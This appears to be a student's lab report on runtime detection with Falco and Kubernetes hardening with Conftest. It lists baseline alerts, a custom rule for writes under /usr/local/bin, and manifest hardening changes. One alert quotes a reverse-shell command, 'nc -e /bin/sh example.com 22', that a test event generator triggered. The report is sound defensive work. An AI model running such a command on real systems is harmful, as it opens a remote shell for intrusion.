# Task 1 — Runtime Security Detection with Falco

### Document baseline alerts observed from `falco.log`

(Described Warnings and Criticals, no Notices or Informational)

Write Binary Under UsrLocalBin (Custom Rule)

  - Priority: Warning

  - Description: File writes detected under /usr/local/bin in containers.

  - Why: Write of file usr/local/bin/custom-rule.txt in container "lab9-helper".

Netcat Remote Code Execution in Container

  - Priority: Warning

  - Description: Detection of netcat running inside a container that allows remote code execution.

  - Why: Container "eventgen", user root, running nc -e /bin/sh example.com 22.

Read sensitive file untrusted

  - Priority: Warning

  - Description: Sensitive file (e.g., /etc/shadow) opened for reading by a non-trusted process.

Drop and execute new binary in container

  - Priority: Critical

  - Description: Execution of a binary not part of the container base image, signifying potential unauthorized code.

Create hardlink over sensitive files

  - Priority: Warning

  - Description: Creation of hardlinks over sensitive files like /etc/shadow.

Detect releaseagent file container escapes

  - Priority: Critical

  - Description: Detection of attempts to exploit container escape using releaseagent files.

PTRACE attached to process

  - Priority: Warning

  - Description: Detection of ptrace PTRACE_ATTACH attempts, a sign of process inspection or debugging.

Search private keys or passwords

  - Priority: Warning

  - Description: Activities searching for private keys or passwords inside containers.

Read sensitive file trusted after startup

  - Priority: Warning

  - Description: Sensitive files read by trusted programs after their startup.

Create symlink over sensitive files

  - Priority: Warning

  - Description: Symlink creation over sensitive files like /etc.

Directory traversal monitored file read

  - Priority: Warning

  - Description: Reads from monitored files via directory traversal attempts.

Fileless execution via memfdcreate

  - Priority: Critical

  - Description: Detection of fileless execution via memfd_create syscall in containers.

Detected AWS credentials search activity

  - Priority: Warning

  - Description: Search for AWS credentials detected inside containers.

Log files were tampered

  - Priority: Warning

  - Description: Log files were opened or potentially tampered by suspicious processes.

Debugfs launched in privileged container

  - Priority: Warning

  - Description: Debug filesystem launched inside privileged containers.

File execution detected from /dev/shm

  - Priority: Warning

  - Description: Executable files run from shared memory /dev/shm inside containers.

Bulk data removed from disk

  - Priority: Warning

  - Description: Bulk data deletion activity detected.

### Document custom rule’s purpose and when it should/shouldn’t fire

Rule Purpose is to detect unauthorized or unexpected writes to binaries inside "/usr/local/bin" in containers.

- It should fire when any process inside a container attempts to open or create (for write) files under /usr/local/bin.

- It should not fire on reads or access events without write intent (readonly), on file operations outside /usr/local/bin, on /usr/local/bin writes on host system

# Task 2 - Policy-as-Code with Conftest

### The policy violations from the unhardened manifest and why each matters for security

There's 2 warnings (liveness, readiness probes missing), and 8 failures related to limits, privilege escalation, root user, readonly FS, and image tag policy violations.

- Missing livenessProbe and readinessProbe: Liveness probes ensure the container is restarted if unhealthy; readiness probes control traffic routing only to healthy pods, maintaining availability and resilience.

- Missing resource limits and requests (cpu and memory): Lack of resource limits can cause resource contention and denial of service by a misbehaving container; resource requests help Kubernetes schedule pods efficiently.
  
- Privilege escalation allowed (allowPrivilegeEscalation not false): Allowing privilege escalation enables container processes to gain higher permissions, increasing risk of container escape or host compromise.

- readOnlyRootFilesystem not set true: Writeable root filesystem increases risk of persistent malware or unauthorized changes; read-only limits damage scope.

- Not running as non-root (runAsNonRoot not true): Running as root inside containers is a major security risk increasing chance of privilege escalations.

- Using disallowed 'latest' image tag: 'latest' tag leads to unpredictable deployments and lack of immutable, auditable references for images.

### The specific hardening changes in the hardened manifest that satisfy policies

To harden configuration based on test direct actions suggested by conftest taken:

- Defined explicit securityContext:

  - runAsNonRoot: true

  - allowPrivilegeEscalation: false

  - readOnlyRootFilesystem: true

  - dropped all capabilities with capabilities.drop ALL

- Set resource requests and limits:

  - Requests: cpu 100m, memory 256Mi

  - Limits: cpu 500m, memory 512Mi

- Added readinessProbe and livenessProbe with HTTP GET on port 3000

- Replaced 'latest' image with fixed version tag v19.0.0

Passing all the test 

### Analysis of the Docker Compose manifest results

Compose manifest has best security practices implemented

- Uses (versioned, not latest) image bkimminichjuice-shopv19.0.0
- Specifies user as 1000:110001 (non-root user)
- Readonly root filesystem enabled (readonly true)
- Temporary file system mounted on /tmp (tmpfs)
- Has security options to disable privilege escalation (securityopt: no-new-privileges: true)
- All capabilities dropped (capdrop ALL)
